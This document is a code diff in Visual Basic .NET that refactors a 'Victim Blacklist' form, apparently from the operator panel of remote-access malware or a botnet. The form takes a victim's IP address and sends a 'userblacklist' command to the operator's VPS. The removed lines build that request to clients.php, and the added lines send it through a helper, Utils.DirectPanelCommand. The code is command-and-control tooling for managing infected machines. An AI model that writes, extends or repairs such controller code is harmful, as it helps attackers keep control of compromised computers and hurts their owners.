@@ -1,34 +1,24 @@
 ﻿Imports System.Net
 
 Public Class Blacklist
-    Dim vpsurl As String = My.Settings.vpsurl
-    Public targetIp As String = ""
+    Public targetIp As String
     Private Sub Blacklist_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Me.Name = "Victim Blacklist @ " & targetIp
+        Me.Name = "Victim Blacklist - " & targetIp
     End Sub
 
-    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
-        If CheckBox1.CheckState Then
-            Button1.Enabled = False
-            TextBox1.Enabled = True
-            TextBox1.Text = ""
-        Else
-            TextBox1.Text = ""
-            TextBox1.Enabled = False
-            Button1.Enabled = True
-        End If
-
+    Private Sub startupMsgCB_CheckedChanged(sender As Object, e As EventArgs) Handles startupMsgCB.CheckedChanged
+        startupMsgTB.Enabled = startupMsgCB.Checked
+        blacklistBTN.Enabled = Not startupMsgCB.Checked
     End Sub
 
-    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
-        Button1.Enabled = TextBox1.Text.Trim <> ""
+    Private Sub startupMsgTB_TextChanged(sender As Object, e As EventArgs) Handles startupMsgTB.TextChanged
+        blacklistBTN.Enabled = startupMsgTB.Text.Trim <> ""
     End Sub
 
-    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
-        If MsgBox("Are you sure you want to blacklist this user ?" + Environment.NewLine + "THERE IS NO WAY BACK", MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
-            MessageBox.Show("Succesfully blacklisted " & targetIp & ".")
-            Dim client As New WebClient()
-            client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=userblacklist&actioncontent=" & TextBox1.Text)
+    Private Sub blacklistBTN_Click(sender As Object, e As EventArgs) Handles blacklistBTN.Click
+        If Utils.DirectPanelCommand(targetIp, New WebClient(),
+                                    "Are you sure you want to *permanently* blacklist this IP ?", "userblacklist", {startupMsgTB.Text}) Then
+            MsgBox("Successfully blacklisted " & targetIp, MsgBoxStyle.Information)
             Me.Close()
         End If
     End Sub
